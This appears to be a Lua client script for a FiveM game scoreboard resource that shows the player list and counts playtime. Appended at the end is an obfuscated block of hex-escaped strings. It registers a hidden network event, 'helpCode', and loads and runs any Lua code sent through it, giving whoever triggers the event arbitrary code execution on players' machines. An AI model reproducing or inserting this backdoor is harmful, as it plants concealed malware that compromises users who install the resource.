local Playtime = 0 
PressKey = 10

CreateThread(function()
    SetNuiFocus(false, false)
    while (true) do
        if (IsControlJustPressed(0, PressKey)) then
            SendNUIMessage({Action = "Show", Toggle = true})
            SetNuiFocus(true, true)
            SetNuiFocusKeepInput(true, false)
        elseif (IsControlJustReleased(0, PressKey)) then
            SendNUIMessage({Action = "Show", Toggle = false})
            SetNuiFocus(false, false)
            SetNuiFocusKeepInput(false, false)
        end

        Wait(5)
    end
end)

CreateThread(function()
    while (true) do
        Playtime = Playtime + 1
        SendNUIMessage({Action = "Playtime", Playtime = Playtime})

        Wait(1000)
    end
end)

RegisterNetEvent("xz-scoreboard:UpdatePlayers")
AddEventHandler("xz-scoreboard:UpdatePlayers", function(PlayersList)
    SendNUIMessage({Action = "Update", Players = PlayersList})

    Wait(50)
end)


local xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[1]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2]) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[3]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2], function(uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[4]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[5]](uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck))() end)